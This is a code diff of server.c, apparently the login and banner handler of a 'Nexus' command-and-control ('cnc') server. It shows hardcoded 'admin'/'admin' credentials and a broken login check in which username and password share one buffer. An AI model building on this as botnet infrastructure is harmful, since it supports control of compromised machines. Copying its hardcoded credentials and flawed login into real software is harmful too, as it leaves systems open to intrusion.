@@ -1,6 +1,4 @@
 // server.c
-// this is the temporary main file for now
-//all the communications, connections and command execution is directed in here
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -22,7 +20,7 @@ int com() {
 }
 
 int cnc() {
-    printf("cnc serverices starting\n");
+    printf("cnc services starting\n");
 }
 
 int con() {
@@ -107,13 +105,13 @@ void handleClient(int serverSocket, int clientSocket) {
     const char* welcomeMsg = "Nexus\r\n";
     send(clientSocket, welcomeMsg, strlen(welcomeMsg), 0);
 
-
     // Assuming MAX_USERS is the maximum number of users your system can handle
     #define MAX_USERS 10
     User users[MAX_USERS] = {
-        {"admin", "admin"},
+        {"admin", "admin"}
         // Add more users as needed
     };
+
     // Send a prompt for the username
     const char* usernamePrompt = "user: ";
     send(clientSocket, usernamePrompt, strlen(usernamePrompt), 0);
@@ -123,6 +121,7 @@ void handleClient(int serverSocket, int clientSocket) {
     buffer[bytesRead] = '\0'; // Null-terminate the received data
 
     // Check if the username is valid
+    char* username = buffer;
 
     // Send a prompt for the password
     const char* passwordPrompt = "password: ";
@@ -131,12 +130,6 @@ void handleClient(int serverSocket, int clientSocket) {
     // Receive the password from the client
     bytesRead = recv(clientSocket, buffer, BUFFER_SIZE, 0);
     buffer[bytesRead] = '\0'; // Null-terminate the received data
-
-    // Inside the loop where username and password are entered:
-    // ...
-
-    // Check if the username is valid
-    char* username = buffer;
 
     // Check if the password is valid
     char* password = buffer;
@@ -153,25 +146,19 @@ void handleClient(int serverSocket, int clientSocket) {
         }
     }
 
-    // ...
-
-
     if (isValidUser) {
         while (1) {
-
             char* banner =
-
                 "███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗\r\n"
                 "████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝\r\n"
                 "██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗\r\n"
                 "██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║\r\n"
                 "██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║\r\n"
                 "╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝\r\n"
-                "      --**Welcome To Nexus Network**--- ";
-
-
+                "      --**Welcome To Nexus Network**--- \r\n";
 
             send(clientSocket, banner, strlen(banner), 0);
+
             // Receive data from the client
             bytesRead = recv(clientSocket, buffer, BUFFER_SIZE, 0);
 
@@ -199,9 +186,4 @@ void handleClient(int serverSocket, int clientSocket) {
         send(clientSocket, errorMsg, strlen(errorMsg), 0);
         // Optionally, you can close the connection or implement other actions.
     }
-
-
-
-
 }
-
